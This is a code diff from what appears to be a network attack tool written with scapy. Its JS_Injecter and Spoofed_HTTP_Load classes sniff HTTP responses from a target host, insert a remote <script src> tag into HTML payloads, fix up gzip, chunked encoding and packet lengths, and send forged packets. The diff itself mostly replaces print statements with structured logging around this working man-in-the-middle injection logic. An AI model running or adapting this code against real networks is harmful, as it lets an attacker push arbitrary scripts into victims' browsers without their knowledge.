@@ -27,6 +27,7 @@ import gzip
 from scapy.all import *
 
 from src import packet_utilities
+from src.log import log
 
 class Spoofed_HTTP_Load(bytes):
     ###OLD
@@ -77,6 +78,8 @@ class Spoofed_HTTP_Load(bytes):
                 #a gzip string. However, this doesnt seem a problem. The injected code is
                 #attached to the compressed packet load, and then it is compressed.
                 print("ERROR WITH GZIP ACTION",action.upper(),":", err)
+                #print(load.decode("utf-8", "ignore"))
+                print(len(load))
                 raise
         
         return load
@@ -87,7 +90,7 @@ class Spoofed_HTTP_Load(bytes):
             chunk_start = load.find(b"\r\n")
             
             if chunk_start == -1:
-                print("CHUNK START NOT FOUND, PROBABLY EMPTY PACKET. THIS SHOULD NOT BE HAPPENING, IM NOT HANDLING EMPYT PACKETS ANYMORE.")
+                print("CHUNK START NOT FOUND, PROBABLY EMPTY PACKET. THIS SHOULD NOT BE HAPPENING BECAUSE IM NOT HANDLING EMPYT PACKETS ANYMORE.")
                 print("Returning", (self.injected_code + load).decode())
                 return self.injected_code + load 
 
@@ -150,7 +153,8 @@ class Spoofed_HTTP_Load(bytes):
         
         if len(new_load) > length_needed:
             #This doesnt seem a problem.
-            print("[ERROR] Despite having removed attributes, length was reduced from", len(load), "to", len(new_load), "and not to", length_needed, "(" + str(len(new_load)-length_needed) + " more bytes than intended)")
+            #print("[ERROR] Despite having removed attributes, length was reduced from", len(load), "to", len(new_load), "and not to", length_needed, "(" + str(len(new_load)-length_needed) + " more bytes than intended)")
+            log.js.warning("exceeded_len", len_load=len(load), len_new_load = len(new_load), len_needed = length_needed, len_difference = str(len(new_load)-length_needed))
             # ~ print(new_load.decode("utf-8", "ignore"))
         return new_load
                 
@@ -211,6 +215,8 @@ class JS_Injecter(threading.Thread):
         self.target = target
         self.timeout = timeout
         self.injected_code = b"<script src=\"" + file_loc.encode("utf-8") + b"\"></script>\n"
+        #b"<script src=\"" + file_loc.encode("utf-8") + b"\" type=\"text/javascript\"></script>\n"
+        #<script src="xxx" type="text/javascript"></script>
 
         self.handled_packets = []
           
@@ -241,19 +247,18 @@ class JS_Injecter(threading.Thread):
         # ~ print(spoof_load.decode("utf-8","ignore"))
         # ~ #spoof_packet.show2()
         
-        print("Spoof load length:", len(spoof_load), "Real load length:", len(real_packet.load))
+        #print("Spoof load length:", len(spoof_load), "Real load length:", len(real_packet.load))
         # ~ if len(spoof_load) > 2000:
             # ~ spoof_packet.show()
         # ~ print(len(spoof_packet["IP"]), len(real_packet["IP"]))
         # ~ print(len(spoof_packet["TCP"]), len(real_packet["TCP"]))
         # ~ print(len(spoof_packet["Raw"]), len(real_packet["Raw"]))
-        print("Spoof packet length:", len(spoof_packet), "Real packet length:", len(real_packet))
-        
+        # print("Spoof packet length:", len(spoof_packet), "Real packet length:", len(real_packet))
         
         spoof_packet["Raw"].remove_payload()
         send(spoof_packet, verbose=0)
         self._add_handled_packet(spoof_packet)
-        print()
+        log.js.info("packet_handled", len_spoof_load = len(spoof_load), len_real_load = len(real_packet.load))
         
     
     def _forward_http_packet(self, packet):
@@ -282,16 +287,18 @@ class JS_Injecter(threading.Thread):
                 #Some packets arrive divided in: 1st packet http header, 2nd packet http body.
                 #If there's chunked encoding, there's nothing i can do with the first packet, which is the one I sniff.
                 #Even if the packet is not chunked, i think it's better not to mess with those packets.
-                print("EMPTY PACKET: FORWARDING")
+                log.js.warning("empty_packet")
                 self._forward_http_packet(packet)
                 
         
     def run(self):
-        print("JS Injecter started with target", self.target)
+        log.js.info("start", timeout=self.timeout, target=self.target)
+        #print("JS Injecter started with target", self.target)
         
         #T not included in lfilter cause its sometimes t and sometimes T
         sniff(filter="tcp and src port 80 and host " + self.target, lfilter= lambda x: x.haslayer("TCP") and x.haslayer("Raw") and b"ype: text/html" in x.load, 
               prn=self.handle_packet, stopperTimeout=3, stopper=self.exit_event.is_set, 
               timeout=self.timeout, store=False)
         
-        print("JS Injecter finished.")
+        log.js.info("finish")
+        #print("JS Injecter finished.")
